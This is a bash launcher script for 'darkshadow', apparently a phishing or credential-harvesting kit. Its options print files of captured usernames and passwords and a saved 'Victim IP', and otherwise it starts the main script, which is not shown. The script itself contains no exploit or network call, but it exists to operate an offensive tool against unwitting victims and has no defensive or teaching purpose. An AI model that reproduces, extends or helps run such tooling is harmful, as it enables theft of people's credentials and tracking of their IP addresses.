#!/bin/bash
# https://github.com/Umairboss1/darkshadow
 
if [[ $(uname -o) == *'Android'* ]];then
	DARKSHADOW_ROOT="/data/data/com.termux/files/usr/opt/darkshadow"
else
	export DARKSHADOW_ROOT="/opt/darkshadow"
fi
 
if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run darkshadow type \`darkshadow\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $DARKSHADOW_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $DARKSHADOW_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $DARKSHADOW_ROOT
	bash ./darkshadow.sh
fi
